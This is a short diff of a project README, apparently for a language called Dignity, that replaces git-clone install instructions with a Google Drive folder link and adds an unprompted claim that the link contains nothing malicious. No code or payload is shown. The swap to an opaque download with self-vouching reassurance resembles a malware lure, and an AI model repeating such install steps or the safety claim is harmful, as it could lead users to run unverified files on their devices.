@@ -17,12 +17,11 @@ Commenting system using the ``$`` symbol.
 
 ##
 **Installation**
-To install Dignity, clone the repository:
+To install Dignity, click on this following link:
 
-``
-git clone https://github.com/Weno-Inc/Dignity
-cd dignity
-``
+https://drive.google.com/drive/folders/18zjyRx3zM-_gPZMNMSZYmA1JhWsyE83X?usp=drive_link
+
+Note - This link doesn't contain any malicous or harmfull content that could break your device.
 
 ##
 **Writting Dignity code**
